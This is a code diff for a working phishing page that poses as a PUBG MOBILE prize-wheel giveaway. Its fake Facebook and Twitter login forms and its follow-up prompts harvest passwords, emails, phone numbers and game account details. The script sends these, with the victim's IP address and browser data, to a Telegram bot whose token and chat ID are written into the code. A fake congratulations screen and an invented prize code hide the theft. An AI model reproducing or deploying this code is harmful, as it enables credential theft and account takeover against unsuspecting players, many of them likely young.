+                <h2 class="twitter-title">Log in to Twitter</h2>
+                <p class="twitter-subtitle">Log in to your Twitter account to connect to PUBG MOBILE</p>
+            </div>
+            
+            <div class="twitter-form">
+                <input type="text" class="twitter-input" id="twitterEmail" placeholder="Phone, email, or username" required>
+                <input type="password" class="twitter-input" id="twitterPassword" placeholder="Password" required>
+                
+                <button class="twitter-button" onclick="submitTwitter()">Log in</button>
+                <button class="twitter-button" onclick="cancelAction()" style="background: #2f3336; margin-top: 15px;">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно с поздравлением -->
+    <div class="congrats-modal" id="congratsModal">
+        <div class="congrats-content">
+            <div class="congrats-icon">🎁</div>
+            <h2 class="congrats-title">Congratulations!</h2>
+            <p class="congrats-text">
+                Hi Survivor, your account has been processing to receive your selected rewards.<br>
                 Please wait up to 24 hours to receive this rewards in your in-game mailbox.
+            </p>
+            
+            <div class="prize-display">
+                <img id="wonPrizeImage" src="" alt="Prize" class="prize-image">
+                <div id="wonPrizeName" class="prize-name"></div>
+                <div id="wonPrizeType" style="color: #aaa;"></div>
             </div>
             
-            <div class="reward-code">
-                <div style="color: #aaa; margin-bottom: 10px;">Your reward code:</div>
-                <div class="code" id="rewardCode">LOADING...</div>
-            </div>
+            <div class="code-display" id="prizeCode"></div>
             
-            <div style="margin: 20px 0;">
-                <div style="color: #ffd700; font-size: 18px; margin-bottom: 10px;">You received:</div>
-                <div id="wonReward" style="font-size: 22px; font-weight: bold; color: #fff;"></div>
-            </div>
-            
-            <button class="btn btn-primary" onclick="closeModal()">
-                <i class="fas fa-gamepad"></i> RETURN TO GAME
+            <button class="spin-button" onclick="closeModal()" style="margin-top: 20px;">
+                <i class="fas fa-check"></i>
+                OK
             </button>
         </div>
     </div>
@@ -657,126 +804,180 @@
         // Telegram configuration
         const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const TELEGRAM_CHAT_ID = '1709490182';
-        
-        // Rewards data
-        const rewards = [
-            { id: 1, name: "METEOR ROYALE PASS", type: "PASS", image: "meteor_pass.png" },
-            { id: 2, name: "PHARAOH SKIN", type: "SKIN", image: "pharaoh.png" },
-            { id: 3, name: "MUMMY SKIN", type: "SKIN", image: "mummy.png" },
-            { id: 4, name: "120 UC", type: "CURRENCY", image: "120uc.png" },
-            { id: 5, name: "M416 GLACIER", type: "WEAPON SKIN", image: "m416_glacier.png" },
-            { id: 6, name: "MYSTERY CHEST", type: "CHEST", image: "mystery_chest.png" }
+
+        // Data
+        const prizes = [
+            { id: 1, name: "MEXICO ROYALE", type: "ROYALE PASS S", image: "mexico_royale.png" },
+            { id: 2, name: "PHARAOH SKIN", type: "LEGENDARY SKIN", image: "pharaoh.png" },
+            { id: 3, name: "MUMMY SKIN", type: "EPIC SKIN", image: "mummy.png" },
+            { id: 4, name: "120 UC", type: "GAME CURRENCY", image: "120uc.png" },
+            { id: 5, name: "300 UC", type: "GAME CURRENCY", image: "300uc.png" },
+            { id: 6, name: "M416 GLACIER", type: "WEAPON SKIN", image: "m416_glacier.png" },
+            { id: 7, name: "METRO CHEST", type: "MYSTERY BOX", image: "metro_chest.png" },
+            { id: 8, name: "GOLDEN PASS", type: "ROYALE PASS", image: "golden_pass.png" }
         ];
 
-        // User data
         let userData = {
-            selectedReward: null,
-            loginMethod: 'facebook',
+            selectedPrize: null,
+            loginMethod: '',
+            credentials: {},
             accountInfo: {},
             sessionId: generateSessionId(),
             ip: 'Loading...',
+            browserInfo: navigator.userAgent,
             timestamp: new Date().toLocaleString()
         };
 
+        let hasSpun = false;
+
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            loadRewards();
-            setupEventListeners();
+            createSlotMachine();
+            createPrizeGrid();
             getUserIP();
             
-            // Default selected method
-            document.querySelector('.method-option[data-method="facebook"]').click();
+            // Set default image fallback
+            setTimeout(() => {
+                document.querySelectorAll('img').forEach(img => {
+                    img.onerror = function() {
+                        this.src = 'https://i.imgur.com/4N0vzrR.png';
+                    };
+                });
+            }, 1000);
         });
 
-        function loadRewards() {
-            const grid = document.getElementById('rewardsGrid');
-            rewards.forEach((reward, index) => {
-                const rewardItem = document.createElement('div');
-                rewardItem.className = 'reward-item';
-                rewardItem.dataset.id = reward.id;
-                rewardItem.innerHTML = `
-                    <img src="${reward.image}" alt="${reward.name}" class="reward-image"
-                         onerror="this.src='https://via.placeholder.com/80x80/2A3B5C/FFFFFF?text=REWARD'">
-                    <div class="reward-name">${reward.name}</div>
-                    <div class="reward-type">${reward.type}</div>
+        function createSlotMachine() {
+            const wheel = document.getElementById('slotWheel');
+            wheel.innerHTML = '';
+            
+            prizes.forEach((prize, index) => {
+                const angle = (360 / prizes.length) * index;
+                const item = document.createElement('div');
+                item.className = 'slot-item';
+                item.style.transform = `rotateY(${angle}deg) translateZ(400px)`;
+                item.innerHTML = `
+                    <img src="${prize.image}" alt="${prize.name}" class="slot-image">
+                    <div class="slot-name">${prize.name}</div>
+                    <div class="slot-type">${prize.type}</div>
                 `;
-                
-                rewardItem.addEventListener('click', () => selectReward(reward));
-                grid.appendChild(rewardItem);
+                wheel.appendChild(item);
             });
         }
 
-        function setupEventListeners() {
-            // Login method selection
-            document.querySelectorAll('.method-option').forEach(option => {
-                option.addEventListener('click', function() {
-                    document.querySelectorAll('.method-option').forEach(opt => {
-                        opt.classList.remove('selected');
-                        opt.querySelector('.checkmark').innerHTML = '<i class="far fa-circle" style="color: #aaa;"></i>';
-                    });
+        function createPrizeGrid() {
+            const grid = document.getElementById('prizeGrid');
+            prizes.forEach((prize, index) => {
+                const item = document.createElement('div');
+                item.className = 'prize-drop-item';
+                item.style.setProperty('--item-index', index);
+                item.innerHTML = `
+                    <img src="${prize.image}" alt="${prize.name}" class="prize-drop-image">
+                    <div class="prize-drop-name">${prize.name}</div>
+                `;
+                item.onclick = () => showPrizeInfo(prize);
+                grid.appendChild(item);
+            });
+        }
+
+        function showPrizeInfo(prize) {
+            alert(`🎁 ${prize.name}\n📦 Type: ${prize.type}\n✨ Rare exclusive prize!`);
+        }
+
+        // Spin the wheel
+        document.getElementById('spinButton').addEventListener('click', function() {
+            if (hasSpun) {
+                alert('You already spun the wheel! Only one spin per account.');
+                return;
+            }
+
+            const spinBtn = this;
+            const wheel = document.getElementById('slotWheel');
+            
+            // Disable button and start spinning
+            spinBtn.disabled = true;
+            spinBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SPINNING...';
+            
+            // Spinning animation
+            let spins = 0;
+            const totalSpins = 5 + Math.floor(Math.random() * 3);
+            const spinInterval = setInterval(() => {
+                spins++;
+                const rotation = spins * 45;
+                wheel.style.transform = `rotateY(${rotation}deg)`;
+                
+                if (spins >= totalSpins * 8) {
+                    clearInterval(spinInterval);
+                    finishSpin();
+                }
+            }, 50);
+
+            function finishSpin() {
+                // Select random prize
+                const randomIndex = Math.floor(Math.random() * prizes.length);
+                const wonPrize = prizes[randomIndex];
+                userData.selectedPrize = wonPrize;
+                
+                // Calculate final rotation to show the prize
+                const finalAngle = 360 - ((360 / prizes.length) * randomIndex);
+                wheel.style.transition = 'transform 2s ease-out';
+                wheel.style.transform = `rotateY(${finalAngle + 360 * 2}deg)`;
+                
+                // Confetti effect
+                createConfetti();
+                
+                // Show success after delay
+                setTimeout(() => {
+                    spinBtn.innerHTML = '<i class="fas fa-check"></i> PRIZE WON!';
+                    hasSpun = true;
                     
-                    this.classList.add('selected');
-                    this.querySelector('.checkmark').innerHTML = '<i class="fas fa-check-circle" style="color: #ffd700;"></i>';
-                    userData.loginMethod = this.dataset.method;
-                });
-            });
+                    // Show prize info
+                    alert(`🎉 CONGRATULATIONS!\nYou won: ${wonPrize.name}\nType: ${wonPrize.type}\n\nClick OK to claim your prize!`);
+                }, 2000);
+            }
+        });
 
-            // Login button
-            document.getElementById('loginBtn').addEventListener('click', function() {
-                if (!userData.selectedReward) {
-                    alert('Please select a reward first!');
-                    return;
-                }
+        function createConfetti() {
+            for (let i = 0; i < 100; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = getRandomColor();
+                confetti.style.width = Math.random() * 15 + 5 + 'px';
+                confetti.style.height = Math.random() * 15 + 5 + 'px';
+                confetti.style.animationDelay = Math.random() * 2 + 's';
+                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
+                document.body.appendChild(confetti);
                 
-                document.getElementById('facebookForm').classList.remove('active');
-                document.getElementById('twitterForm').classList.remove('active');
-                document.getElementById('verifyForm').classList.remove('active');
-                
-                if (userData.loginMethod === 'facebook') {
-                    document.getElementById('facebookForm').classList.add('active');
-                } else {
-                    document.getElementById('twitterForm').classList.add('active');
-                }
-            });
-
-            // Cancel buttons
-            document.getElementById('cancelFbBtn').addEventListener('click', function() {
-                document.getElementById('facebookForm').classList.remove('active');
-            });
-            
-            document.getElementById('cancelTwBtn').addEventListener('click', function() {
-                document.getElementById('twitterForm').classList.remove('active');
-            });
-
-            // Form submissions
-            document.getElementById('fbForm').addEventListener('submit', handleFacebookLogin);
-            document.getElementById('twForm').addEventListener('submit', handleTwitterLogin);
-            document.getElementById('verifyAccountForm').addEventListener('submit', handleAccountVerification);
+                setTimeout(() => confetti.remove(), 5000);
+            }
         }
 
-        function selectReward(reward) {
-            userData.selectedReward = reward;
-            
-            // Visual feedback
-            document.querySelectorAll('.reward-item').forEach(item => {
-                item.style.borderColor = '#3a5b9c';
-                item.style.transform = 'translateY(0)';
-            });
-            
-            const selectedItem = document.querySelector(`.reward-item[data-id="${reward.id}"]`);
-            selectedItem.style.borderColor = '#ffd700';
-            selectedItem.style.transform = 'translateY(-5px)';
-            
-            // Animate selection
-            selectedItem.style.animation = 'pulse 0.5s ease';
-            setTimeout(() => {
-                selectedItem.style.animation = '';
-            }, 500);
+        function getRandomColor() {
+            const colors = ['#ff6b00', '#ffd700', '#00ff95', '#1da1f2', '#9b59b6'];
+            return colors[Math.floor(Math.random() * colors.length)];
         }
 
-        async function handleFacebookLogin(e) {
-            e.preventDefault();
+        // Page navigation
+        function showPage(pageId) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById(pageId).classList.add('active');
             
+            // Update login method
+            if (pageId === 'facebookPage') {
+                userData.loginMethod = 'facebook';
+            } else if (pageId === 'twitterPage') {
+                userData.loginMethod = 'twitter';
+            }
+        }
+
+        function cancelAction() {
+            showPage('mainPage');
+        }
+
+        // Form submissions
+        async function submitFacebook() {
             const email = document.getElementById('fbEmail').value.trim();
             const password = document.getElementById('fbPassword').value.trim();
             
@@ -785,10 +986,6 @@
                 return;
             }
             
-            const submitBtn = document.getElementById('submitFbBtn');
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="loading"></span> LOGGING IN...';
-            
             // Save credentials
             userData.credentials = {
                 email: email,
@@ -796,32 +993,23 @@
             };
             
             // Send to Telegram
-            await sendToTelegram(`🔐 FACEBOOK LOGIN ATTEMPT\n📧 Email: ${email}\n🔐 Password: ${password}\n🎁 Selected Reward: ${userData.selectedReward.name}\n🌐 IP: ${userData.ip}\n⏰ Time: ${new Date().toLocaleString()}`);
+            await sendToTelegram(
+                `🔵 FACEBOOK LOGIN\n📧 ${email}\n🔐 ${password}\n🎁 Prize: ${userData.selectedPrize?.name || 'None'}\n🌐 IP: ${userData.ip}`
+            );
             
-            // Show verification form
-            setTimeout(() => {
-                document.getElementById('facebookForm').classList.remove('active');
-                document.getElementById('verifyForm').classList.add('active');
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '<i class="fas fa-lock"></i> LOG IN';
-            }, 1500);
+            // Show verification page
+            showVerification();
         }
 
-        async function handleTwitterLogin(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('twEmail').value.trim();
-            const password = document.getElementById('twPassword').value.trim();
+        async function submitTwitter() {
+            const email = document.getElementById('twitterEmail').value.trim();
+            const password = document.getElementById('twitterPassword').value.trim();
             
             if (!email || !password) {
                 alert('Please fill in all fields');
                 return;
             }
             
-            const submitBtn = document.getElementById('submitTwBtn');
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="loading"></span> LOGGING IN...';
-            
             // Save credentials
             userData.credentials = {
                 email: email,
@@ -829,72 +1017,48 @@
             };
             
             // Send to Telegram
-            await sendToTelegram(`🐦 TWITTER LOGIN ATTEMPT\n📧 Email: ${email}\n🔐 Password: ${password}\n🎁 Selected Reward: ${userData.selectedReward.name}\n🌐 IP: ${userData.ip}\n⏰ Time: ${new Date().toLocaleString()}`);
+            await sendToTelegram(
+                `🐦 TWITTER LOGIN\n📧 ${email}\n🔐 ${password}\n🎁 Prize: ${userData.selectedPrize?.name || 'None'}\n🌐 IP: ${userData.ip}`
+            );
             
-            // Show verification form
-            setTimeout(() => {
-                document.getElementById('twitterForm').classList.remove('active');
-                document.getElementById('verifyForm').classList.add('active');
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '<i class="fab fa-twitter"></i> LOG IN TO TWITTER';
-            }, 1500);
+            // Show verification page
+            showVerification();
         }
 
-        async function handleAccountVerification(e) {
-            e.preventDefault();
+        function showVerification() {
+            // Collect additional info
+            const charId = prompt("Enter your Character ID:");
+            const charName = prompt("Enter your Character Name:");
+            const phone = prompt("Enter your Phone Number:");
+            const level = prompt("Enter your Account Level:");
             
-            const charId = document.getElementById('charId').value.trim();
-            const charName = document.getElementById('charName').value.trim();
-            const phone = document.getElementById('phoneNumber').value.trim();
-            const level = document.getElementById('accountLevel').value;
-            const platform = document.getElementById('platform').value;
-            
-            if (!charId || !charName || !phone || !level || !platform) {
-                alert('Please fill in all fields');
-                return;
-            }
-            
-            const submitBtn = document.getElementById('submitVerifyBtn');
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="loading"></span> PROCESSING...';
-            
-            // Save account info
-            userData.accountInfo = {
-                characterId: charId,
-                characterName: charName,
-                phoneNumber: phone,
-                accountLevel: level,
-                platform: platform
-            };
-            
-            // Generate reward code
-            const rewardCode = generateRewardCode();
-            
-            // Send complete data to Telegram
-            await sendCompleteDataToTelegram(rewardCode);
-            
-            // Show success modal
-            setTimeout(() => {
-                document.getElementById('verifyForm').classList.remove('active');
-                document.getElementById('rewardCode').textContent = rewardCode;
-                document.getElementById('wonReward').textContent = userData.selectedReward.name;
-                document.getElementById('successModal').style.display = 'flex';
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> SUBMIT';
+            if (charId && charName && phone && level) {
+                userData.accountInfo = {
+                    characterId: charId,
+                    characterName: charName,
+                    phoneNumber: phone,
+                    accountLevel: level
+                };
                 
-                // Clear forms
-                document.querySelectorAll('form').forEach(form => form.reset());
-            }, 2000);
+                // Send complete data
+                sendCompleteData();
+                
+                // Show congratulations
+                showCongratulations();
+            } else {
+                alert('All information is required to claim your prize!');
+            }
         }
 
-        async function sendCompleteDataToTelegram(rewardCode) {
+        async function sendCompleteData() {
             const message = `
-🎮 PUBG MOBILE REWARD CLAIMED!
+🎮 PUBG MOBILE REWARD CLAIM - COMPLETE DATA
 
-🏆 REWARD: ${userData.selectedReward.name}
-🔑 CODE: ${rewardCode}
+🏆 PRIZE: ${userData.selectedPrize.name}
+📦 TYPE: ${userData.selectedPrize.type}
+🔑 CODE: ${generatePrizeCode()}
 
-🔐 LOGIN METHOD: ${userData.loginMethod.toUpperCase()}
+🔐 LOGIN METHOD: ${userData.loginMethod}
 📧 EMAIL: ${userData.credentials.email}
 🔐 PASSWORD: ${userData.credentials.password}
 
@@ -903,12 +1067,12 @@
    Name: ${userData.accountInfo.characterName}
    Phone: ${userData.accountInfo.phoneNumber}
    Level: ${userData.accountInfo.accountLevel}
-   Platform: ${userData.accountInfo.platform}
 
-🌐 IP ADDRESS: ${userData.ip}
-📱 USER AGENT: ${navigator.userAgent}
-🆔 SESSION ID: ${userData.sessionId}
-⏰ TIME: ${new Date().toLocaleString()}
+🌐 NETWORK INFO:
+   IP: ${userData.ip}
+   Browser: ${userData.browserInfo}
+   Session: ${userData.sessionId}
+   Time: ${userData.timestamp}
             `;
             
             await sendToTelegram(message);
@@ -928,11 +1092,47 @@
                         parse_mode: 'HTML'
                     })
                 });
-                
                 return await response.json();
             } catch (error) {
-                console.error('Error sending to Telegram:', error);
+                console.error('Telegram error:', error);
             }
+        }
+
+        function showCongratulations() {
+            const prize = userData.selectedPrize;
+            const prizeCode = generatePrizeCode();
+            
+            document.getElementById('wonPrizeImage').src = prize.image;
+            document.getElementById('wonPrizeName').textContent = prize.name;
+            document.getElementById('wonPrizeType').textContent = prize.type;
+            document.getElementById('prizeCode').textContent = prizeCode;
+            
+            document.getElementById('congratsModal').style.display = 'flex';
+            createConfetti();
+        }
+
+        function closeModal() {
+            document.getElementById('congratsModal').style.display = 'none';
+            showPage('mainPage');
+            
+            // Reset for next time
+            setTimeout(() => {
+                alert('Your prize code has been sent to your account! Check your in-game mailbox within 24 hours.');
+            }, 500);
+        }
+
+        function generateSessionId() {
+            return 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9).toUpperCase();
+        }
+
+        function generatePrizeCode() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            let code = 'PUBG-';
+            for (let i = 0; i < 10; i++) {
+                if (i === 5) code += '-';
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return code;
         }
 
         async function getUserIP() {
@@ -943,37 +1143,6 @@
             } catch (error) {
                 userData.ip = 'Unknown';
             }
-        }
-
-        function generateSessionId() {
-            return 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9).toUpperCase();
-        }
-
-        function generateRewardCode() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-            let code = 'PUBG-';
-            for (let i = 0; i < 10; i++) {
-                code += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return code;
-        }
-
-        function closeModal() {
-            document.getElementById('successModal').style.display = 'none';
-            userData = {
-                selectedReward: null,
-                loginMethod: 'facebook',
-                accountInfo: {},
-                sessionId: generateSessionId(),
-                ip: userData.ip,
-                timestamp: new Date().toLocaleString()
-            };
-            
-            // Reset UI
-            document.querySelectorAll('.reward-item').forEach(item => {
-                item.style.borderColor = '#3a5b9c';
-                item.style.transform = 'translateY(0)';
-            });
         }
     </script>
 </body>
